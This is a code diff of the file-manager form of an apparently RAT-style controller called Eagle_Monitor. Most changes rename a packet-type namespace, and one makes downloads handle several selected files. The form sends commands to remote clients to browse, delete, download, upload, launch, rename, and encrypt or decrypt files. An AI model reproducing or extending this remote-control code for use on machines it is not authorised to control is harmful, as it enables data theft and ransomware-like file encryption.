@@ -68,11 +68,11 @@ namespace Eagle_Monitor.Forms
             C.fileManagerForm.loadingCircle1.Active = true;
             C.fileManagerForm.filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, C.fileManagerForm.disksComboBox.Text };
+            D.DataReturn = new object[] { Shared.PacketType.GET_F, C.fileManagerForm.disksComboBox.Text };
             C.fileManagerForm.labelPath.Text = C.fileManagerForm.disksComboBox.Text;
             Task.Run(() => C.SendData(D.Serialize()));
         }
@@ -88,11 +88,11 @@ namespace Eagle_Monitor.Forms
                 C.fileManagerForm.loadingCircle1.Active = true;
                 C.fileManagerForm.filesListView.Items.Clear();
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, NewPath };
+                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -108,11 +108,11 @@ namespace Eagle_Monitor.Forms
                 C.fileManagerForm.loadingCircle1.Active = true;
                 C.fileManagerForm.filesListView.Items.Clear();
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, NewPath };
+                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -134,11 +134,11 @@ namespace Eagle_Monitor.Forms
                 C.fileManagerForm.loadingCircle1.Active = true;
                 C.fileManagerForm.filesListView.Items.Clear();
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, NewPath };
+                D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                 Task.Run(() => C.SendData(D.Serialize())); 
             }
         }
@@ -150,18 +150,18 @@ namespace Eagle_Monitor.Forms
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 string pathtodelete = labelPath.Text + filesListView.SelectedItems[0].Text;
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.DELETE_F, pathtodelete };
+                D.DataReturn = new object[] { Shared.PacketType.DELETE_F, pathtodelete };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
 
         private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
+            /*if (filesListView.SelectedItems[0].Tag.ToString() == "FILE" && filesListView.SelectedItems.Count == 1)
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 string pathtodownload = labelPath.Text + filesListView.SelectedItems[0].Text;
@@ -174,11 +174,32 @@ namespace Eagle_Monitor.Forms
                 downloadFileForm.labelPath.Text = filename;
                 downloadFileForm.Show();
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.DOWNLOAD_F, pathtodownload };
+                D.DataReturn = new object[] { Shared.PacketType.DOWNLOAD_F, pathtodownload };
+                Task.Run(() => C.SendData(D.Serialize()));
+            }*/
+
+            foreach (ListViewItem i in filesListView.SelectedItems)
+            {
+                Client C = Client.ClientDictionary[this.IP_Origin];
+                string pathtodownload = labelPath.Text + i.Text;
+                DownloadFileForm downloadFileForm = new DownloadFileForm();
+                string filename = Utilities.SplitPath(pathtodownload);
+                downloadFileForm.Name = filename;
+                downloadFileForm.loadingCircle1.Visible = true;
+                downloadFileForm.loadingCircle1.Active = true;
+                downloadFileForm.Text = filename;
+                downloadFileForm.labelPath.Text = filename;
+                downloadFileForm.Show();
+                Data D = new Data();
+                D.Type = Shared.PacketType.PLUGIN;
+                D.Plugin = Plugins.FilesManager;
+                D.IP_Origin = C.IP;
+                D.HWID = C.HWID;
+                D.DataReturn = new object[] { Shared.PacketType.DOWNLOAD_F, pathtodownload };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -194,11 +215,11 @@ namespace Eagle_Monitor.Forms
                     string path = labelPath.Text + Utilities.SplitPath(o.FileName);
                     Client C = Client.ClientDictionary[this.IP_Origin];
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.FilesManager;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.UPLOAD_F, path, B };
+                    D.DataReturn = new object[] { Shared.PacketType.UPLOAD_F, path, B };
                     Task.Run(() => C.SendData(D.Serialize()));
                 }
             }
@@ -216,11 +237,11 @@ namespace Eagle_Monitor.Forms
                         string path = labelPath.Text + filesListView.SelectedItems[0].Text + "\\" + Utilities.SplitPath(o.FileName);
                         Client C = Client.ClientDictionary[this.IP_Origin];
                         Data D = new Data();
-                        D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                        D.Type = Shared.PacketType.PLUGIN;
                         D.Plugin = Plugins.FilesManager;
                         D.IP_Origin = C.IP;
                         D.HWID = C.HWID;
-                        D.DataReturn = new object[] { Shared.PacketTypes.PacketType.UPLOAD_F, path, B };
+                        D.DataReturn = new object[] { Shared.PacketType.UPLOAD_F, path, B };
                         Task.Run(() => C.SendData(D.Serialize()));
                     }
                 }
@@ -234,11 +255,11 @@ namespace Eagle_Monitor.Forms
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 string filetolaunch = labelPath.Text + filesListView.SelectedItems[0].Text;
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.LAUNCH_F, filetolaunch };
+                D.DataReturn = new object[] { Shared.PacketType.LAUNCH_F, filetolaunch };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -260,11 +281,11 @@ namespace Eagle_Monitor.Forms
                 }
                 New_Path += New_Name;
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.FilesManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.RENAME_F, filetorename , New_Path };
+                D.DataReturn = new object[] { Shared.PacketType.RENAME_F, filetorename , New_Path };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -278,11 +299,11 @@ namespace Eagle_Monitor.Forms
             C.fileManagerForm.loadingCircle1.Active = true;
             C.fileManagerForm.filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, NewPath };
+            D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -294,11 +315,11 @@ namespace Eagle_Monitor.Forms
             disksComboBox.Items.Clear();
             filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = this.IP_Origin;
             D.HWID = this.ClientHWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_D };
+            D.DataReturn = new object[] { Shared.PacketType.GET_D };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -313,11 +334,11 @@ namespace Eagle_Monitor.Forms
                     loadingCircle1.Active = true;
                     disksComboBox.Items.Clear();
                     filesListView.Items.Clear();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.FilesManager;
                     D.IP_Origin = this.IP_Origin;
                     D.HWID = this.ClientHWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_D };
+                    D.DataReturn = new object[] { Shared.PacketType.GET_D };
                     Task.Run(() => C.SendData(D.Serialize()));
                     break;
 
@@ -327,11 +348,11 @@ namespace Eagle_Monitor.Forms
                     C.fileManagerForm.loadingCircle1.Visible = true;
                     C.fileManagerForm.loadingCircle1.Active = true;
                     C.fileManagerForm.filesListView.Items.Clear();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.FilesManager;
                     D.IP_Origin = C.IP;
                     D.HWID = C.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_F, NewPath };
+                    D.DataReturn = new object[] { Shared.PacketType.GET_F, NewPath };
                     Task.Run(() => C.SendData(D.Serialize()));
                     break;
             
@@ -346,12 +367,12 @@ namespace Eagle_Monitor.Forms
                 {
                     Client C = Client.ClientDictionary[this.IP_Origin];
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.FileEncryption;
                     D.IP_Origin = this.IP_Origin;
                     D.HWID = this.ClientHWID;
                     string fileToEncrypt = labelPath.Text + selected.Text;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.ENCRYPT_F, Utilities.algorithm, true, fileToEncrypt, Utilities.key };
+                    D.DataReturn = new object[] { Shared.PacketType.ENCRYPT_F, Utilities.algorithm, true, fileToEncrypt, Utilities.key };
                     Task.Run(() => C.SendData(D.Serialize()));
                 }
             }
@@ -365,12 +386,12 @@ namespace Eagle_Monitor.Forms
                 {
                     Client C = Client.ClientDictionary[this.IP_Origin];
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.FileEncryption;
                     D.IP_Origin = this.IP_Origin;
                     D.HWID = this.ClientHWID;
                     string fileToEncrypt = labelPath.Text + selected.Text;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.DECRYPT_F, Utilities.algorithm, false, fileToEncrypt, Utilities.key };
+                    D.DataReturn = new object[] { Shared.PacketType.DECRYPT_F, Utilities.algorithm, false, fileToEncrypt, Utilities.key };
                     Task.Run(() => C.SendData(D.Serialize()));
                 }
             }
@@ -384,11 +405,11 @@ namespace Eagle_Monitor.Forms
             C.fileManagerForm.loadingCircle1.Active = true;
             C.fileManagerForm.filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHORTCUT_DESKTOP };
+            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DESKTOP };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -400,11 +421,11 @@ namespace Eagle_Monitor.Forms
             C.fileManagerForm.loadingCircle1.Active = true;
             C.fileManagerForm.filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHORTCUT_DOCUMENTS };
+            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DOCUMENTS };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -416,11 +437,11 @@ namespace Eagle_Monitor.Forms
             C.fileManagerForm.loadingCircle1.Active = true;
             C.fileManagerForm.filesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.FilesManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHORTCUT_DOWNLOADS };
+            D.DataReturn = new object[] { Shared.PacketType.SHORTCUT_DOWNLOADS };
             Task.Run(() => C.SendData(D.Serialize()));
         }
     }
